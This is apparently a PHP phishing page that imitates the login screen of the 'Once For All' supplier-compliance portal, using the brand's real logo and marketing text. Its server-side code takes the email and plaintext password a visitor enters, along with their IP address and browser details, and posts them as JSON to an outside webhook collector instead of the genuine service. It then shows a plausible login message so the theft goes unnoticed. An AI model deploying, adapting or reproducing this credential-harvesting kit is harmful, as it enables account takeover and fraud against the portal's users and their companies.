<?php
// ---- Manejo del envío ----
$apiUrl = 'https://yummy-optician-99.webhook.cool';
$resultMsg = null;
$resultType = null; // 'success' | 'error'

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Sanitizar entrada básica (para mostrarla después si hace falta)
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    if ($email === '' || $password === '') {
        $resultType = 'error';
        $resultMsg = 'Por favor, completa email y contraseña.';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $resultType = 'error';
        $resultMsg = 'El email no tiene un formato válido.';
    } else {
        // Construir payload JSON
        $payload = json_encode([
            'email' => $email,
            'password' => $password,
            'ip' => $_SERVER['REMOTE_ADDR'] ?? null,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
            'timestamp' => date('c') // ISO 8601
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        // Llamada cURL a la API
        $ch = curl_init($apiUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Accept: application/json',
            ],
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_TIMEOUT => 15, // segundos
        ]);

        $responseBody = curl_exec($ch);
        $curlErrNo = curl_errno($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($curlErrNo) {
            $resultType = 'error';
            $resultMsg = 'No se pudo contactar con el servicio de autenticación. Inténtalo más tarde.';
        } else {
            // Intentar decodificar JSON
            $json = json_decode($responseBody, true);
            if ($httpCode >= 200 && $httpCode < 300) {
                $resultType = 'success';
                // Mensaje de la API si existe; si no, mensaje genérico
                $resultMsg = isset($json['message']) ? $json['message'] : 'Login correcto.';
                // Aquí podrías guardar tokens de sesión/cookies si la API los retorna:
                // if (!empty($json['token'])) { $_SESSION['token'] = $json['token']; }
            } else {
                // Extraer error devuelto por la API (si lo hay)
                $apiError = is_array($json) && isset($json['error']) ? $json['error'] : null;
                $apiMessage = is_array($json) && isset($json['message']) ? $json['message'] : null;

                $resultType = 'error';
                $resultMsg = $apiMessage ?? $apiError ?? "Error de autenticación (HTTP $httpCode).";
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Once For All - Login</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f7f8fa;
      color: #2e2e72;
    }
    .container { display: flex; min-height: 100vh; }
    .left {
      width: 75%;
      background: #fff url('https://www.transparenttextures.com/patterns/hexellence.png') repeat;
      display: flex; align-items: center; justify-content: center;
      position: relative; padding: 60px;
    }
    .form-content { width: 100%; max-width: 400px; }
    .logo { width: 160px; position: absolute; top: 40px; left: 60px; }
    .lang { position: absolute; top: 40px; right: 60px; font-weight: 500; font-size: 14px; cursor: pointer; }
    h2 { font-size: 26px; margin-bottom: 30px; text-transform: capitalize; }
    form { display: flex; flex-direction: column; gap: 20px; }
    input[type="email"], input[type="password"] {
      padding: 14px; border-radius: 10px; border: 1px solid #ddd; font-size: 16px;
      background-color: #fff; box-shadow: 0 1px 4px rgba(0,0,0,0.08); color: #333;
    }
    input::placeholder { color: #999; }
    .forgot { font-size: 14px; color: #0077cc; text-decoration: none; text-align: right; }
    .login-btn {
      padding: 14px; background: #e4007f; color: #fff; border: none; border-radius: 30px;
      font-size: 16px; cursor: pointer;
    }
    .or-divider { margin: 20px 0; text-align: center; font-size: 14px; color: #999; }
    .join { font-size: 14px; }
    .join a { color: #0077cc; text-decoration: none; font-weight: bold; }
    .right {
      width: 25%; background-color: #fff; padding: 60px;
      display: flex; flex-direction: column; justify-content: center;
    }
    .right h3 { font-size: 24px; color: #2e2e72; margin-bottom: 20px; }
    .right p { font-size: 16px; color: #333; max-width: 400px; }
    .alert {
      margin-bottom: 16px; padding: 12px 14px; border-radius: 10px; font-size: 14px;
      border: 1px solid transparent;
    }
    .alert-success {
      background: #f0fff4; border-color: #c6f6d5; color: #22543d;
    }
    .alert-error {
      background: #fff5f5; border-color: #fed7d7; color: #742a2a;
    }
    @media (max-width: 960px) {
      .container { flex-direction: column; }
      .left, .right { width: 100%; padding: 30px; }
      .logo, .lang { position: static; margin-bottom: 20px; }
      .form-content { max-width: 100%; }
      .right { align-items: center; text-align: center; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left">
      <img
        class="logo"
        src="https://identity.staging.onceforall.com//auth/resources/rrvf8/login/portal-sywa/img/onceforall-logo.svg"
        alt="Once For All Logo"
      >
      <div class="lang">EN ▼</div>
      <div class="form-content">
        <h2>Welcome back to sywa</h2>

        <?php if ($resultMsg !== null): ?>
          <div class="alert <?php echo $resultType === 'success' ? 'alert-success' : 'alert-error'; ?>">
            <?php echo htmlspecialchars($resultMsg, ENT_QUOTES, 'UTF-8'); ?>
          </div>
        <?php endif; ?>

        <form action="" method="POST" novalidate>
          <input
            type="email"
            name="email"
            placeholder="User email"
            value="<?php echo isset($email) ? htmlspecialchars($email, ENT_QUOTES, 'UTF-8') : ''; ?>"
            required
            autocomplete="username"
          >
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            autocomplete="current-password"
          >
          <a href="#" class="forgot">Forgot your password?</a>
          <button class="login-btn" type="submit">Log in</button>
        </form>

        <div class="or-divider">OR</div>
        <div class="join">No account yet? <a href="#">Join us</a></div>
      </div>
    </div>
    <div class="right">
      <h3>From compliance to opportunity: secure your risks, develop your relationships</h3>
      <p>
        Thanks to the Once For All digital ecosystem, simplify your obligations, secure your client-supplier relationships,
        and create new business opportunities while ensuring your compliance.
      </p>
    </div>
  </div>
</body>
</html>
